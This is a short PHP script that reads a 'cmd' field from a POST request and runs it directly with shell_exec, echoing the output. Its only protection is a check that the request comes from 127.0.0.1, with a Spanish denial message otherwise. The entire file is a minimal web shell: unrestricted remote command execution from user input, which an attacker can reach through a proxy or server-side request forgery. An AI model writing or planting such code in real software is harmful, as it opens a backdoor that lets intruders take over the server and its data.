<?php
if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1')
    die('Solo se puede acceder desde localhost');
$comando = $_POST['cmd'];
$output = shell_exec($comando);
echo $output;